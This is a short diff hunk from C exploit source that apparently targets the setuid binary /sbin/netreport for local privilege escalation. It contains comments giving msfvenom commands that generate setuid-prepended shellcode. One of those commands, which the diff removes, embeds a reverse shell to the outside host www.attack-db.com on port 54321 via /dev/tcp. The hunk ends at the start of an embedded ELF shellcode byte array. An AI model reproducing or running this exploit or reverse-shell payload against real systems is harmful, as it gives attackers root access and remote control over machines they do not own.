@@ -40,7 +40,6 @@ char suid_binary[] = "/sbin/netreport";
 
 /*
 * $ ./msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
-* $ ./msfvenom -p linux/x64/exec CMD='bash -i >& /dev/tcp/www.attack-db.com/54321 0>&1' PrependSetuid=True -f elf | xxd -i
 */ 
 unsigned char shell_code[] = {
   0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
